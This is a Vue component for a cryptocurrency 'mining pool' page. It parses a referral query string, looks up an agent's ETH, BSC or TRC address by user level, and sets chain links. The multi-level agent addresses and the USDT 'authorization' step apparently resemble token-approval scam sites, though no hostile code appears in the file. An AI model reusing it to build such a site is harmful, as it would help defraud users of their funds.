<template>
    <div>
        <TabContainerMiningPoolTabContainerMiningPoolPooldata :defaultObj="defaultObj" />
        <TabContainerMiningPoolTabContainerMiningPoolSectionTitle />
        <TabContainerMiningPoolTabContainerMiningPoolUserOutput :defaultObj="defaultObj" />
        <TabContainerMiningPoolTabContainerMiningPoolHelpCenter />
        <TabContainerMiningPoolTabContainerMiningPoolFooter :defaultObj="defaultObj" />
    </div>
</template>
<script>
// 引用状态机
import { createNamespacedHelpers } from "vuex";
// 获取状态机内部封装的方法
const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home")
export default {
    name: 'Tab_container_MiningPool',
    data() {
        return {
            defaultObj: {
                str: 'minering',
                chainType: 'ETH',
                url: 'https://ethereum.org'
            },
            arr: []
        }
    },
    computed: {
        ...mapState(['obj', 'Msg'])
    },
    methods: {
        ...mapActions(['GetUserId', 'GoAutoRegister']),
        async finshdata() {
            //如果有数据
            if (this.$route.query.data) {
                // 点击授权 解析restful数据
                let res = this.$route.query.data;
                let ar = res.split('?')
                let arr = []
                ar.forEach((item, index) => {
                    if (index != ar.length - 1) {
                        let b = item.split('=');
                        let obj = {};
                        obj[b[0]] = b[1];
                        arr.push(obj)
                    }
                })
                console.log(arr);
                this.arr = arr;
                // 获取解析后的账号id
                let userId = arr[0].userParentId
                console.log(arr);
                // 发送请求获取账号地址
                await this.GetUserId({ id: userId })
                console.log(this.obj);
                // 如果是一级用户
                if (this.arr.length == 2) {
                    // 添加授权用户对应链地址 
                    if (this.arr[1].eth_usdt) {
                        this.defaultObj = {
                            str: 'ETH',
                            chainType: 'ETH',
                            url: 'https://ethereum.org'
                        }
                    } else if (this.arr[1].bsc_usdt) {
                        this.defaultObj = {
                            str: 'BSC',
                            chainType: 'BSC',
                            url: 'https://bscscan.com/'
                        }
                    } else if (this.arr[1].trc_usdt) {
                        this.defaultObj = {
                            str: 'TRC',
                            chainType: 'TRC',
                            url: 'https://tronscan.org'
                        }
                    }
                } else {
                    // 如果是二级用户及以上
                    // 添加授权用户对应链地址
                    //区块链类型
                    var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()
                    var agentAddress
                    if (chainType == 'ETH') {
                        agentAddress = this.obj.ethMainnetAddress + '-ETH'
                    }
                    else if (chainType == 'BSC') {
                        agentAddress = this.obj.bscMainnetAddress + '-BSC'
                    }
                    else if (chainType == 'TRC') {
                        agentAddress = this.obj.trcMainnetAddress + '-TRC'
                    }
                    else {
                        agentAddress = this.obj.ancestorAddress
                    }
                    let agentAdressArr = agentAddress.split('-')
                    if (agentAdressArr[1] == 'ETH') {
                        this.defaultObj = {
                            str: 'ETH',
                            chainType: 'ETH',
                            url: 'https://ethereum.org'
                        }
                    }
                    else if (agentAdressArr[1] == 'BSC') {
                        this.defaultObj = {
                            str: 'BSC',
                            chainType: 'BSC',
                            url: 'https://bscscan.com/'
                        }
                    }
                    else if (agentAdressArr[1] == 'TRC') {
                        this.defaultObj = {
                            str: 'TRC',
                            chainType: 'TRC',
                            url: 'https://tronscan.org'
                        }
                    }
                }
            }
        }
    },
    created() {
        this.finshdata()
    }
}
</script>
<style scoped>
</style>